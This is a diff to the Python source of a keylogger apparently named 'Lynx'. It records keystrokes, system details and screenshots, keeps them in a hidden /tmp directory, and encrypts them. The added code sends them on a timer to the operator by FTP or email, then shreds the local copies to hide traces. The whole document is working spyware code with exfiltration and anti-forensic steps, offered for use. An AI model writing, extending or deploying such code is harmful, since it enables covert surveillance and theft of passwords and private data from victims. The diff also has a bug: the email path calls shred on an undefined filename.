@@ -22,12 +22,23 @@ import hashlib
 import base64
 from threading import Timer
 import time
+import ftplib
+import datetime
 
-EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
-EMAIL_PASSWORD = "YOUR_PASSWORD"
+METHOD = "ftp" # or "email"
+EMAIL = {
+    "EMAIL_ADDRESS": "YOUR_EMAIL_ADDRESS",
+    "EMAIL_PASSWORD": "YOUR_PASSWORD",
+    "SMTP_SERVER": "smtp.gmail.com", # Use the SMTP server of your email provider
+    "SMTP_PORT": 587 # Port of your SMTP Server
+}
+FTP = {
+    "HOST": "127.0.0.1",
+    "PORT": 21,
+    "USERNAME": "YOUR_USERNAME",
+    "PASSWORD": "YOUR_PASSWORD"
+}
 INTERVAL = 60 # In seconds
-SMTP_SERVER = "smtp.gmail.com" # Use the SMTP server of your email provider
-SMTP_PORT = 587 # Port of your SMTP Server
 RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxdZr6CoSNcoTQwPY3Ovu
 JsdVzsVyIjELEelnnzCP9PyORhIAsHMrxNYQ8WVvdILLdX0gXQGLaehpRcwGZy7J
@@ -47,13 +58,25 @@ PhNgq3uleTRFpQeVbEr0fHECAwEAAQ==
 class Keylogger():
     def __init__(self):
         self.interval = INTERVAL
-        self.email = EMAIL_ADDRESS
-        self.password = EMAIL_PASSWORD
-        self.smtp_host = SMTP_SERVER
-        self.smtp_port = SMTP_PORT
         self.log = "Keylogger started ...\n"
         self.dir = "/tmp/.cache/.lynx"
         self.system_info = ""
+        self.method = METHOD
+        self.get_date = lambda: str(datetime.datetime.now())[:-7].replace(":", "-")
+        self.start = self.get_date()
+        if self.method == "email":
+            self.email = EMAIL["EMAIL_ADDRESS"]
+            self.password = EMAIL["EMAIL_PASSWORD"]
+            self.smtp_host = EMAIL["SMTP_SERVER"]
+            self.smtp_port = EMAIL["SMTP_PORT"]
+        elif self.method == "ftp":
+            self.ftp_host = FTP["HOST"]
+            self.ftp_port = FTP["PORT"]
+            self.ftp_username = FTP["USERNAME"]
+            self.ftp_password = FTP["PASSWORD"]
+        else:
+            quit()
+
         os.makedirs(self.dir) if not os.path.exists(self.dir) else None
     
     def append_to_log(self, string):
@@ -78,21 +101,50 @@ class Keylogger():
         self.append_to_system_info(f"Architecture : {arch}\n")
         self.append_to_system_info(f"MAC address : {mac_address}\n") 
         self.append_to_system_info(f"Unique machine ID : {machine_id}\n")
-        self.send_mail(Encryption().encrypt(self.system_info))
+        if self.method == "email":
+            self.send_mail(Encryption().encrypt(self.system_info))
+        elif self.method == "ftp":
+            filename = f"{self.dir}/sysinfo_{self.get_date()}"
+            with open(filename, "w") as file:
+                file.write(Encryption().encrypt(self.system_info))
+            self.send_ftp(filename)
+        self.shred(filename)
     
     def screenshot(self):
-        filename = ''.join(random.choice(string.ascii_letters) for x in range(10))
+        filename = self.get_date()
         img = pyscreenshot.grab()
-        path = f"{self.dir}/.{filename}.png"
+        path = f"{self.dir}/{filename}.png"
         img.save(path)
         return path
+
+    def shred(self, filename, length=38):
+        random_data = lambda size: ''.join(random.choice(string.printable) for _ in range(size)) 
+        # Overwrite file
+        filesize = os.path.getsize(os.path.abspath(filename))
+        with open(filename, "w") as file:
+            for i in range(length):
+                file.write(random_data(filesize))
+                file.seek(0)
+            # Rename file
+            basename = os.path.basename(filename)
+            path = os.path.dirname(filename)
+            nameLength = len(basename) 
+
+            for i in range(nameLength - 1):
+                newnamelen = nameLength - 1
+                newname = lambda: f"{path}/{''.join('0' for _ in range(newnamelen))}"
+                os.rename(filename, newname())
+                filename = newname()
+                nameLength = newnamelen
+            os.remove(f"{path}/0")
     
     def send_mail(self, body, attachment=None):
         msg = MIMEMultipart()
         msg["To"] = self.email
         msg["From"] = self.email
         msg["Subject"] = f"Lynx Report"
-        msgText = MIMEText(f'<b>{body}\n</b><br/><img src="cid:{attachment}"/><br/>', 'html')   
+        # msgText = MIMEText(f'<b>{body}\n</b><br/><img src="cid:{attachment}"/><br/>', 'html')
+        msgText = MIMEText(f'<b>{body}\n</b><br/><img src="cid:{attachment}"/><br/>', 'html') if attachment else MIMEText(f'<b>{body}\n</b>', 'html')
         msg.attach(msgText)
         if attachment:
             with open(attachment, 'rb') as fp:
@@ -106,6 +158,25 @@ class Keylogger():
         server.sendmail(self.email, self.email, msg.as_string())
         server.quit()
     
+    def send_ftp(self, file):
+        ftp = ftplib.FTP()
+        ftp.connect(host=self.ftp_host, port=self.ftp_port)
+        ftp.login(user=self.ftp_username, passwd=self.ftp_password)
+        ftp.encoding = "utf-8"
+        # Checks if directory "lynx" exists, else creates it
+        content = []
+        listcontent = ftp.dir("", content.append)
+        content = [x.split()[-1] for x in content if x.startswith("d")]
+        if "lynx" in content:
+            pass
+        else:
+            ftp.mkd("lynx")
+        ftp.cwd("lynx")
+
+        o = open(os.path.abspath(file), "rb")
+        ftp.storbinary(f"STOR {os.path.basename(file)}", o)
+        ftp.close()
+
     def callback(self, event):
         name = event.name
         if len(name) > 1:
@@ -121,20 +192,31 @@ class Keylogger():
         self.log += name
 
     def report(self):
-        self.send_mail(Encryption().encrypt(self.log), self.screenshot()) #ENC
+        # Timer
         class RepeatTimer(Timer):
             def run(self):
                 while not self.finished.wait(self.interval):
                     self.function(*self.args, **self.kwargs)
+        
+        if self.method == "email":
+            self.send_mail(Encryption().encrypt(self.log), self.screenshot()) 
+        elif self.method == "ftp":
+            path = f"{self.dir}/log_from_{self.start}_to_{self.get_date()}"
+            with open(path, "w") as file:
+                file.write(Encryption().encrypt(self.log))
+            ss = self.screenshot()
+            self.send_ftp(path)
+            self.send_ftp(ss)
+            self.shred(path)
+            self.shred(ss, 15)
         timer = RepeatTimer(self.interval, self.report)
-        timer.daemon = True
         timer.start()
 
     def run(self):
         self.sysinfo()
         Keyboard.on_press(self.callback)
         time.sleep(self.interval)
-        self.report()        
+        self.report()
 
 
 class Encryption():
